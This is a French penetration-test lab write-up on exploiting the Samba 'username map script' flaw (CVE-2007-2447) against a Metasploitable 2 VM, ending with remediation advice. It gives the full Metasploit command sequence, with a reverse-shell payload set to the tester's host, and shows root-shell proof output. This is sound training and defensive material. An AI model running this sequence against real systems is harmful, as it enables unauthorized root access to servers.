Samba — username map script

Exécution de commande via un nom d'utilisateur non assaini (RCE)

Service / PortSamba (SMB) — ports 139/445
CibleMetasploitable 2 — 192.168.56.101
CVECVE-2007-2447
RésultatAccès root (shell de commande, sans identifiant valide)
Testé parZANNOU Josaphat

1. Identification

Lorsque Samba est configuré avec l'option username map script, il transmet le nom d'utilisateur reçu lors d'une connexion à un script shell côté serveur. Dans les versions vulnérables, ce nom n'est pas assaini : un nom contenant des métacaractères shell fait exécuter des commandes arbitraires, sans qu'un compte valide soit nécessaire. Le scan de reconnaissance identifie un serveur Samba sur les ports 139 et 445.

2. Méthode d'identification de la CVE et du module

Première question : cette version de Samba a-t-elle une faille connue ?

$ searchsploit samba 3.0

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution | unix/remote/16320.rb

La faille existe pour la plage 3.0.20–3.0.25rc3, celle de Metasploitable 2. Chemin du module dans msfconsole :

$ msfconsole -q -x "search usermap_script; exit"

#  Full Name                           Disclosure Date  Rank       Check  Name
-  ---------                           ---------------  ----       -----  ----
0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

Puis la CVE et le mécanisme :

$ msfconsole -q -x "info exploit/multi/samba/usermap_script; exit"

References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
  http://samba.org/samba/security/CVE-2007-2447.html

La section References confirme CVE-2007-2447. Le module se connecte au service et envoie un nom d'utilisateur forgé contenant une commande shell ; faute d'assainissement, le username map script l'exécute avec les droits du démon Samba — root sur cette VM.

Commande injectée via le champ « nom d'utilisateur » d'une connexion SMB — aucun identifiant valide requis. Exécution avec les droits root du démon Samba.

3. Démarche d'exploitation

Démarche interactive dans msfconsole, commande par commande :

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(multi/samba/usermap_script) > set LPORT 4446
LPORT => 4446

Point d'attention — pas de RPORT à régler (445 par défaut) ni de payload à changer (cmd/unix/reverse par défaut convient). LHOST/LPORT restent nécessaires car il s'agit d'un reverse shell.

4. Preuve d'accès obtenu

run -z déclenche l'attaque ; sessions -c "..." -i 1 exécute les commandes de preuve dans la session :

msf6 exploit(multi/samba/usermap_script) > run -z
[*] Command shell session 1 opened (192.168.56.1:4446 -> 192.168.56.101:40060)
msf6 exploit(multi/samba/usermap_script) > sessions -c "id; uname -a; hostname; whoami" -i 1
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=0(root) gid=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
root

L'accès est root directement, sans étape d'élévation de privilèges : le démon Samba tourne en root, donc la commande injectée via le nom d'utilisateur s'exécute en root. Une simple option de configuration mal choisie donne un accès système complet sans aucun identifiant valide.

5. Remédiation

RECOMMANDATIONS
  • Mettre à jour Samba vers une version corrigée (postérieure à 3.0.25rc3), qui assainit le nom d'utilisateur avant de le passer au script.
  • Supprimer l'option username map script de smb.conf si elle n'est pas indispensable ; si elle l'est, n'y passer que des valeurs strictement contrôlées et échappées.
  • N'exposer SMB qu'aux réseaux de confiance (pare-feu sur 139/445), jamais sur Internet.
  • Faire tourner les services réseau sous un compte non privilégié quand c'est possible, pour limiter l'impact d'une compromission.
